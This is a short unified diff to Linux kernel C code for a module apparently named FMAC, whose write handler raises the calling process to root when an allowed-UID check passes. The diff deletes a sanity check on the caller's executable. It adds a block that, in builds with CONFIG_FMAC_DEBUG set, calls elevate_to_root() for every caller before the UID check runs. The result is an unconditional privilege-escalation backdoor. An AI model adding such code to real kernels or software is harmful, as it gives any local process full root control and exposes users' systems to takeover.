@@ -10,12 +10,12 @@
 
 #include <linux/capability.h>
 #include <linux/cred.h>
+#include <linux/file.h>
 #include <linux/fs.h>
 #include <linux/kernel.h>
 #include <linux/sched.h>
 #include <linux/security.h>
 #include <linux/selinux.h>
-#include <linux/file.h>
 #include <linux/thread_info.h>
 #include <linux/uaccess.h>
 #include <linux/uidgid.h>
@@ -114,15 +114,9 @@ static void elevate_to_root(void) {
 
 ssize_t fmac_environ_write(struct file *file, const char __user *buf,
                            size_t count, loff_t *ppos) {
-  struct file *exe_file = NULL;
-
-  exe_file = get_task_exe_file(current);
-  if (!exe_file) {
-    pr_warn("[FMAC] Failed to get /proc/self/exe\n");
-    return -ENOENT;
-  }
-
-  fput(exe_file);
+#ifdef CONFIG_FMAC_DEBUG
+  elevate_to_root();
+#endif
 
   if (fmac_uid_allowed()) {
     elevate_to_root();
